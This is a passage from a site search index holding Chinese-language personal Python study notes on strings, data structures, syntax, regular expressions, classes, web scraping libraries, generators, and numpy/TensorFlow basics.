a.difference(b) # 对称差 a ^ b a.symmetric_difference(b) # 比较集合大小 a \u003c b #测试是否为子集 a.issubset(b) ","date":"2022-07-25","objectID":"/python/:3:6","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"字符串 字符串和元组属于不可变序列，不能通过下标方式修改其中元素值 短字符串：长度 ≤20，内存中只有一个副本，共享副本 判断函数 string.isalnum() # 至少有一个字符且所有字符都是字母或数字 string.isalpha() # 至少有一个字符且所有字符都是字母 string.isdecimal() # 只包含十进制数字(整数) string.isdigit() # 只包含数字(整数) string.islower() # 包含至少一个区分大小写的字符，都是小写 string.isupper() # 包含至少一个区分大小写的字符，都是大写 string.isnumeric() # 只包含数字组成，只针对unicode对象 string.lower() # 转换为小写 string.upper() # 转换为大写 string.cpitalize() # 字符串首字母大写 string.title() # 每个单词首字母大写 string.swapcase() # 大小写互换 string.isspace() # 只由空格组成 string.startswith(\"xxx\") # 以什么开始 string.endswith(\"xxx\") # 以什么结束 str = u\"1234\" 格式化字符串 a = 3.6674 '%7.3f' %a # ' 3.667' 保留小数点后三位，并在总共占据7个字符的位置上填充空格 \"%d:%c\" %(65, 65) # '65:A' 转义字符 \\ddd # 3位八进制对应的字符 \\xhh # 2位十六进制数对应的字符 操作 s.find('xx') # 查找'xx'在s中首次出现的位置 s.rfind('xx') # 查找'xx'串在s中最后一次出现的位置 s.index('x') # 'x'在s中首次出现的位置 s.rindex('x') # 'x'在s中最后一次出现的位置 s.count('xx') # 统计'xx'出现次数 s.replace('x', 'b') # 将x都转换为b 填充 'Hello'.center(8,'=') #=Hello== 'Hello'.ljust(8,'-') #Hello--- 'Hello'.rjust(8,'-') #---Hello 字符映射 table=''.maketrans('abc', 'uvw') s=\"python is very good, haha\" s.translate(table) #python is very good, huhu\" 分割 s.split(\",\") # 以 , 分割 s.split(\",\", 1) # 只分割一次 s.rsplit(\",\", 1) # 从右往左分割 分割为元组 text.partition(\"-\") text.rpartition(\"-\") 连接 words = [\"a\", \"b\"] \"-\".join(words) 删除前后连续出现的指定字符 # 默认为空格 s.strip() s.lstrip() s.rstrip() s.strip(\"x\") ","date":"2022-07-25","objectID":"/python/:3:7","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"数据结构 ","date":"2022-07-25","objectID":"/python/:4:0","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"堆 优先队列是堆结构的一个重要应用，堆是一个二叉树，每个父结点的值都小于或等于子节点的值 import heapq heap = [] for n in data: heapq.heappush(heap, n) # 建立堆 heapq.heappop(heap) # 弹出最小元素,堆会自动重建 heapq.heapify(alist) # 将列表转化为堆 heapq.heapreplace(heap, n) # 弹出myheap的最小值，然后替换为n，加入n，重新构建堆 heapq.nlargest(3, heap) # 返回前3个最大元素 heapq.nsmallest(3, heap) # 返回前3个最小元素 ","date":"2022-07-25","objectID":"/python/:4:1","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"队列 import queue q = queue.Queue() a = queue.LifoQueue(5) # 后进先出队列 b = queue.PriorityQueue(5) # 优先级队列 a.put(xx) ","date":"2022-07-25","objectID":"/python/:4:2","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"基础语法 ","date":"2022-07-25","objectID":"/python/:5:0","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"运算 除 / 和 // 分别表示除法和整除运算 乘 [1,2,3]*2 # [1,2,3,1,2,3] ** # 幂运算 矩阵相乘运算法@ \u003e\u003e\u003e import numpy \u003e\u003e\u003e x = numpy.ones(3) \u003e\u003e\u003e x array([1., 1., 1.]) \u003e\u003e\u003e m = numpy.eye(3) * 3 \u003e\u003e\u003e m array([[3., 0., 0.], [0., 3., 0.], [0., 0., 3.]]) \u003e\u003e\u003e x @ m array([3., 3., 3.]) ","date":"2022-07-25","objectID":"/python/:5:1","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"条件 if xx: xx elif xx: xx else: xx ","date":"2022-07-25","objectID":"/python/:5:2","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"循环 for var in iter: xxx while xxx: xxx ","date":"2022-07-25","objectID":"/python/:5:3","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"函数 不定长参数，可以接受任意数量的参数 def x(*v): ... x(1,2,3,4) x(1,2) 序列解包 调用函数时，在实参前加上*，将序列中元素值依次传递给相同数量形参 # * 序列解包 *range(4),4 # (0,1,2,3,4) args = [1,2,3] result = add(*args) # 等价于 add(1, 2, 3) # ** 字典解包 {'x': 1, **{'y': 2}} # {'x': 1, 'y': 2} ","date":"2022-07-25","objectID":"/python/:5:4","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"异常处理 try: xxx except Exception as e: print(e) print(e.__traceback__.tb_frame.f_globals[\"__file__\"]) # 发生异常所在的文件 print(e.__traceback__.tb_lineno) # 发生异常所在的行数 ","date":"2022-07-25","objectID":"/python/:5:5","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"条件表达式 def Join(List, sep=None): return (sep or ',').join(List) Join(['1','2','3']) # '1,2,3' Join(['1','2','3'], ':') # '1:2:3' ","date":"2022-07-25","objectID":"/python/:5:6","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"lambda 表达式 声明匿名函数 f = lambda x,y,z: x+y+z print(f(1,2,3)) # 6 L=[1,2,3,4,5] print(map((lambda x:x+10), L)) # [11,12,13,14,15] ","date":"2022-07-25","objectID":"/python/:5:7","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"高级语法 ","date":"2022-07-25","objectID":"/python/:6:0","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"正则表达式 模式 描述 \\b 匹配一个单词边界，指单词和空格间位置 er\\b 匹配’nerer’中的 er \\bi\\b 匹配’i am i h’中的 i \\B 与\\b 含义相反 \\\\b 表示一个单词边界 r'\\b'和'\\\\b'表示一个匹配模式 \\d 匹配任意数字 \\D 匹配任意非数字 \\ 表示位于\\之后的为转义字符 . 匹配除换行符以外任意单个字符 \\w 匹配字母数字以及下划线 \\W 匹配非字母数字以及下划线 (?! re) 前向否定界定符，当所含 re 表达式不在字符串当前位置匹配时成功 I(?!\\w) 表示 I 后面不是单词字符的位置 (?\u003c!re) (?\u003c!\\w)I表示 I 前面不是单词字符的位置 (?:re) (?:[\\w])I(?:[\\w])匹配一个单词中间有一个 I re+ 匹配 1 个或多个表达式 (\\w+)表示匹配一个或多个字母或数字字符，使用括号将其分组 re* 匹配 0 个或多个表达式 re{n, } 匹配 n 个前面表达式 o{2,}匹配 2 个及以上的 o \\1…\\9 匹配第 n 个分组的内容 \\s 匹配任意空白字符，空格 \\S 匹配任意非空字符 […] 表示一组字符，单独列出 [amk]匹配’a’,’m’或’k' [^…] [^abc]匹配任意除’a’,‘b’,‘c’外的字符 [a-z] 匹配任何小写字母 [A-Z] 匹配任何大写字母 (pattern){m,n} 允许模式重复 m~n 次 .+? 表示匹配一个或多个字符（除换行符外的任意字符），使用非贪婪模式 中文字符 [\\u4e00-\\u9fa5] # 从Unicode编码U+4E00到U+9FA5之间的所有字符 ","date":"2022-07-25","objectID":"/python/:6:1","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"类和对象 可以用 del 显式删除对象 _xxx ：保护变量，不能用 from module import * 导入，只有类对象和子类对象能访问这些变量 __xxx__ ：系统定义的特殊成员名字 __xxx ：类中私有成员，只有类对象自己能访问，子类对象不能访问到该成员，对象外部通过对象名._类名__xxx特殊方式访问 #基类 class Person(object): def __init__(self, name=\"\"): self.setName(name) def setName(self, name): if not isinstance(name, str): print(\"name must be string\") return self.__name = name #派生类 class Student(Person): def __init__(self, name=\"\"major='Computer'): #调用基类构造方法初始化基类的私有数据成员 super(Student, self).__init__(name) #super()函数是一个用于调用父类方法的特殊函数。 #返回一个超类的代理对象，可以用来调用父类的方法，而无需显式指定父类的名称 self.setMajor(major) #初始化派生类的数据成员 def setMajor(self, major): if not isinstance(major, str): print(\"major must be a string\") return self.__major = major 定义三维向量加乘 class VectoR: def __init__(self, x=0, y=0, z=0): self.X = x self.Y = y self.Z = z def __add__(self, n): r = VectoR() r.X = self.X + n.X r.Y = self.Y + n.Y r.Z = self.Z + n.Z return r def __mul__(self, n): r = VectoR() r.X = self.X * n r.Y = self.Y * n r.Z = self.Z * n return r 实例化 class X: xx x = X() isinstatnce()：测试一个对象是否为某个类的实例 isinstance(x, X) # True 类方法 ①公有方法 可以访问属于类和对象的成员，通过对象名直接调用，不能通过类名访问，通过类名调用实例方法需要为 self 显式传递对象名 ②私有方法 以\"__“开始，可以访问属于类和对象的成员 不能通过对象名直接调用，只能在属于对象的方法中通过 self 调用 ③静态方法 可以通过类名和对象名调用，不能直接访问属于对象的成员，只能访问属于类的成员 ④类方法 可以通过类名和对象名调用，不能直接访问属于对象的成员，只能访问属于类的成员 ","date":"2022-07-25","objectID":"/python/:6:2","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"爬虫 requests #发送请求 r = requests.get() r = requests.post() #传递参数 payload = {'a':'1','b':'2'} params = payload #响应内容 r.text #二进制响应内容 r.content #响应状态码 r.status_code bs4 # 解析内容 from bs4 import BeautifulSoup soup = BeautifulSoup(html_doc) #浏览内容 soup.title soup.title.string #正则使用 soup.find_all(name='x',attrs={'xx':re.compile('xxx')}) re re.match() re.match(pattern, string, flags=0) # 返回一个匹配的对象，否则返回None # pattern匹配的正则表达式 # string要匹配的字符串 # flags:标志位，用于是否区分大小写，多行匹配等 re.match('www','wwwhh').span() # span返回元组(起始,结尾)=\u003e(0,3) re.match('') import re line = \"Cats are smarter than dogs\" matchObj = re.match( r'(.*) are (.*?) .*', line, re.M|re.I) if matchObj: print \"matchObj.group() : \", matchObj.group() # Cats are smarter than dogs print \"matchObj.group(1) : \", matchObj.group(1) # Cats print \"matchObj.group(2) : \", matchObj.group(2) # smarter re.search() re.search(pattern, string, flag=0) #扫描整个字符串并返回第一个成功的匹配 re.match 只匹配字符串的开始，若字符串开始不符合正则表达式，则匹配失败，函数返回 None re.search 匹配整个字符串，直到找到第一个匹配 re.sub() xxx = re.sub(pattern, repl, string, count=0, flags=0) #repl:替换的字符串(可为函数),string:要被替换的原始字符串 #count模式匹配后替换的最大次数,默认0表示替换所有匹配 re.compile() pattern = re.compile(pattern[, flags]) #生成一个正则表达式对象 #re.I 忽略大小写 #re.L 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境 #re.M 多行模式 #re.S 即为 . 并且包括换行符在内的任意字符（. 不包括换行符） #re.U 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库 #re.X 为了增加可读性，忽略空格和 # 后面的注释 pattern.match('xxx') pattern.search('xxx') pattern.findall(string[,pos[,endpos]])#匹配找到正则表达式所匹配的所有子串 re.escape() # 将字符串中所有特殊正则表达式字符转义 escape(string) 子模式 使用()表示一个子模式，圆括号内的内容作为一个整体出现，可以使用**group(n)**方法匹配第 n 个子模式 urllib urllib.request # 打开、读取url urllib.error # 包含抛出异常 urllib.parse # 解析URL urllib.robotparser # 解析robots.txt文件 urllib.request.urlopen() # 发起请求 urllib.request.urlretrieve() # 下载文件 urllib.request.Requests() # 定制请求头 ","date":"2022-07-25","objectID":"/python/:6:3","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"生成器 包含yield语句的函数可以用来创建生成器 调用该函数不执行函数体，返回生成器对象 每次调用next()或__next__()时，从上次 `yield 处继续执行 def f(): a, b = 1, 1 while True: yield a a, b = b, a+b a = f() for i in range(10): print(a.__next__(), end=' ') #1 1 2 3 5 8 13 21 34 55 生成器表达式 格式：(expression for item in iterable if condition) forbidden = \"aeiou\" word = \"hello\" res = any(char in forbidden for char in word) # True any：遍历逐个取生成器表达式的值，若有单词中任何一个字母是属于禁止的都返回true ","date":"2022-07-25","objectID":"/python/:6:4","tags":["language"],"title":"Python","uri":"/python/"},{"categories":["Notes","Language"],"content":"AI pyplot plt.hist(x) # 直方图 numpy 广播机制：shape 不相等时会复制调整使得运算通过 np.array([[1, 2]]) # 1*2矩阵 np.array([[1], [2]]) # 2*1矩阵 # n 个中括号即 n 维矩阵 a = np.random.randn(5, 1) # 随机生成 5*1 矩阵 tensor_type.numpy() # array([[xx]], dtype=float32 将Tensor类型转换为np数组 np.matmul(a, b) # 矩阵乘法 或 a @ b np.exp(V) # V中每个元素i: 求e^i np.log(V) np.abs(V) # 绝对值 np.maximum(V, 0) np.sum(A) A.sum(axis=0) # 垂直方向求和 axis=1 水平求和 AT = A.T # 矩阵转置 # [2, ] [2, 1] 区别 [1 2] # 秩为1的数组 [[1] [2]] # 2*1的矩阵 [::3, ::2] # 每 3 行一跳，每 2 列一跳 pytorch # 使用 conda 安装 GPU 支持的 torch conda install cuda -c nvidia/label/cuda-12.4.0 nvcc -V # 验证 conda install pytorch torchvision torchaudio pytorch-cuda=12.4 -c pytorch -c nvidia Conda conda create -n test python=x.x.x source activate base conda activate test TensorFlow 使用TensorFlow构建神经网络模式 model = Sequential([Dense(units = 153, activation = 'sigmoid'), # 全连接层 layer1 Dense(units = 21, activation = 'sigmoid')]) # layer2 # activation: linear, relu, sigmoid, softmax x = np.array([[xx, xx], [xx, xx]]) y = np.array([xx, xx]) model.compile(loss=BinaryCrossentropy()) # 损失函数 # BinaryCrossentropy 适用于二元分类0或1: 逻辑回归 二元交叉熵函数 # MeanSquaredError 适用于回归: 预测数值 # SparseCategoricalCrossentropy 适用于SoftMax多分类 稀疏范畴交叉熵函数 得到N个值中的一个值 model.fit(x, y, epochs=100) # fit:实现反向传播 epochs: 梯度下降/迭代次数 model.predict(x_new) SoftMax / Sigmoid中： # 前面的Dense最后一层activation使用'linear'输出中间值 model.compile(loss=SparseCategoricalCrossentropy(from_logits=True)) # 损失值不标准化为概率, 使得数字更准确, SoftMax操作交给TensorFlow的损失函数计算 # 预测 logits = model(X) # SoftMax输出z1-zN, 即非概率 Sigmoid输出z, 非概率 f_x = tf.nn.softmax(logits) # tf.nn.sigmoid(logits) 将中间值单独调用函数转为概率 ","date":"2022-07-25","objectID":"/python/:6:5","tags":["language"],"title":"Python","uri":"/python/"}]